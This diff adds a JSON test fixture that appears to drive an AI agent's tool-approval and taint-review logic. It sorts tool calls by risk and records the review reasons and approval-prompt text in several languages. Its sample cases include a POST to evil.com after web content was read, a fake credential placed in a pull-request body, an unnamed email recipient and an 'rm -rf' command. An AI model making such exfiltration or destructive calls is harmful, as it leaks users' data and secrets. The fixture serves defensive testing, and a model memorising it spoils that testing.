@@ -1,0 +1,274 @@
+{
+ "categories": [
+  {
+   "name": "execute_command",
+   "args": {
+    "command": "ls"
+   },
+   "category": "shell",
+   "safe": false
+  },
+  {
+   "name": "http_request",
+   "args": {
+    "method": "post",
+    "url": "https://x.y"
+   },
+   "category": "network_write",
+   "safe": false
+  },
+  {
+   "name": "http_request",
+   "args": {},
+   "category": null,
+   "safe": false
+  },
+  {
+   "name": "http_request",
+   "args": {
+    "method": 5
+   },
+   "category": "network_write",
+   "safe": false
+  },
+  {
+   "name": "share_web_page",
+   "args": {
+    "action": "share"
+   },
+   "category": "network_write",
+   "safe": false
+  },
+  {
+   "name": "share_web_page",
+   "args": {
+    "action": "list"
+   },
+   "category": null,
+   "safe": false
+  },
+  {
+   "name": "send_message",
+   "args": {
+    "to": "a"
+   },
+   "category": null,
+   "safe": true
+  },
+  {
+   "name": "read_file",
+   "args": {
+    "path": "/a"
+   },
+   "category": null,
+   "safe": true
+  },
+  {
+   "name": "github_create_pr",
+   "args": {},
+   "category": "external",
+   "safe": false
+  },
+  {
+   "name": "mcp_custom_tool",
+   "args": {},
+   "category": "external",
+   "safe": false
+  },
+  {
+   "name": "write_file",
+   "args": {
+    "path": "x"
+   },
+   "category": "file_write",
+   "safe": false
+  },
+  {
+   "name": "create_skill",
+   "args": {},
+   "category": "skill_mutation",
+   "safe": false
+  },
+  {
+   "name": "call_user",
+   "args": {},
+   "category": "user_contact",
+   "safe": false
+  }
+ ],
+ "reviews": [
+  {
+   "label": "owner",
+   "name": "send_message",
+   "args": {
+    "to": "eve@x.com"
+   },
+   "review": null
+  },
+  {
+   "label": "tainted-new",
+   "name": "send_message",
+   "args": {
+    "to": "eve@x.com"
+   },
+   "review": {
+    "kind": "taint",
+    "reason": "You did not name eve@x.com as a recipient, and this run has read content from web_search.",
+    "reasonKey": "newRecipient",
+    "reasonParams": {
+     "recipient": "eve@x.com"
+    }
+   }
+  },
+  {
+   "label": "tainted-named",
+   "name": "send_message",
+   "args": {
+    "to": "Bob <bob@example.com>"
+   },
+   "review": null
+  },
+  {
+   "label": "tainted-persist",
+   "name": "create_task",
+   "args": {
+    "name": "x"
+   },
+   "review": {
+    "kind": "taint",
+    "reason": "create_task would outlast this run, and this run has read content from web_search.",
+    "reasonKey": "outlast"
+   }
+  },
+  {
+   "label": "tainted-http",
+   "name": "http_request",
+   "args": {
+    "method": "POST",
+    "url": "https://www.evil.com/x"
+   },
+   "review": {
+    "kind": "taint",
+    "reason": "POST to evil.com, a host you did not name, and this run has read content from web_search.",
+    "reasonKey": "newHost",
+    "reasonParams": {
+     "host": "evil.com"
+    }
+   }
+  },
+  {
+   "label": "tainted-secret",
+   "name": "github_create_pr",
+   "args": {
+    "body": "sk-proj-abcdefghijklmnopqrstuvwxyz123"
+   },
+   "review": {
+    "kind": "taint",
+    "reason": "github_create_pr would send what looks like a credential, and this run has read content from web_search.",
+    "reasonKey": "credential"
+   }
+  },
+  {
+   "label": "shared-tool",
+   "name": "execute_command",
+   "args": {
+    "command": "ls"
+   },
+   "review": {
+    "kind": "audience",
+    "reason": "Someone in telegram chat g1 other than you asked for execute_command.",
+    "reasonKey": "someoneElse"
+   }
+  },
+  {
+   "label": "shared-msg-other",
+   "name": "send_message",
+   "args": {
+    "to": "someone"
+   },
+   "review": {
+    "kind": "audience",
+    "reason": "A run started from telegram chat g1 wants to message someone.",
+    "reasonKey": "messageOther",
+    "reasonParams": {
+     "target": "someone"
+    }
+   }
+  },
+  {
+   "label": "shared-msg-origin",
+   "name": "send_message",
+   "args": {
+    "to": "g1"
+   },
+   "review": null
+  },
+  {
+   "label": "shared-file",
+   "name": "analyze_image",
+   "args": {
+    "image_path": "/etc/x.png"
+   },
+   "review": {
+    "kind": "audience",
+    "reason": "A run started from telegram chat g1 wants to open /etc/x.png, which did not come with the message.",
+    "reasonKey": "openFile"
+   }
+  },
+  {
+   "label": "shared-file-ok",
+   "name": "analyze_image",
+   "args": {
+    "image_path": "/m/a.png"
+   },
+   "review": null
+  }
+ ],
+ "copies": [
+  {
+   "language": "en",
+   "agentName": "NeoAgent",
+   "title": "NeoAgent needs your OK",
+   "action": "Run a command",
+   "detail": "rm -rf /tmp/x now",
+   "reason": "You did not name eve as a recipient, and the run has read outside content."
+  },
+  {
+   "language": "en",
+   "agentName": "NeoAgent",
+   "title": "NeoAgent needs your OK",
+   "action": "Use mcp tool",
+   "detail": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx…",
+   "reason": ""
+  }
+ ],
+ "options": [
+  {
+   "id": "allow",
+   "label": "✅ Erlauben",
+   "word": "Erlauben",
+   "emoji": "✅",
+   "decision": "approved",
+   "scope": "once"
+  },
+  {
+   "id": "always",
+   "label": "🔁 Immer erlauben",
+   "word": "Immer erlauben",
+   "emoji": "🔁",
+   "decision": "approved",
+   "scope": "always"
+  },
+  {
+   "id": "deny",
+   "label": "🚫 Nicht erlauben",
+   "word": "Nicht erlauben",
+   "emoji": "🚫",
+   "decision": "denied",
+   "scope": "once"
+  }
+ ],
+ "hint": "Antworte mit „Erlauben“, „Immer erlauben“ oder „Nicht erlauben“.",
+ "note": "Answer within 5 minutes",
+ "timedOut": "⏱️ Pas de réponse à temps, donc ignoré : Run a command"
+}
